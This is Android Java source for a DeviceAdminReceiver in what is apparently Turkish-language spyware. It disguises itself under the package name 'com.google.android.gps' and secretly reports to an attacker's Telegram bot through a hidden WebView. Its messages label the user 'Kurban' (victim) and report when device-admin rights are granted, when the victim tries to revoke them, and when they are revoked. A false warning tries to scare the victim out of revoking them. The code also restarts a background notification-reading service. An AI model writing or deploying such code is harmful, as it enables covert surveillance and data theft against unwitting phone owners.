package com.google.android.gps ;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.os.*;
import android.view.*;
import android.webkit.*;

public class DeviceAdmin extends DeviceAdminReceiver{

	
	void send(Context c, String s){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		String temp = "🔔 "+c.getResources().getString(R.string.takmaad)+bosluk()+"Device: "+s1+" "+s2+" "+s3+bosluk()
		+"Bilgi: "+s;
		String token = c.getResources().getString(R.string.botid);
		String user = c.getResources().getString(R.string.userid);
		String telegram = "https://api.telegram.org/bot"+token+"/sendMessage?text="+temp+"&chat_id="+user;
		(new WebView(c)).loadUrl(telegram);
	}
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	@Override
	public void onEnabled(Context context, Intent intent) {
		send(context,"Kurban cihaz yöneticisine izin verdi!");
		context.startService(new Intent(context,NotificationService.class));
		super.onEnabled(context,intent);
	}

	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		super.onDisableRequested(context,intent);
		send(context,"Kurban cihaz yöneticisini devre dışı bırakmaya uğraşıyor!");
		context.startService(new Intent(context,NotificationService.class));
		return "Eğer bu cihaz yöneticisini iptal ederseniz cihazınız sağlıklı çalışmayabilir";
	}

	@Override
	public void onDisabled(Context context, Intent intent) {
		send(context,"Kurban cihaz yöneticisini devre dışı bıraktı!");
		context.startService(new Intent(context,NotificationService.class));
		super.onDisabled(context,intent);
	}

	@Override
	public void onReceive(Context context, Intent intent){
		context.startService(new Intent(context,NotificationService.class));
		super.onReceive(context, intent);
	}
}
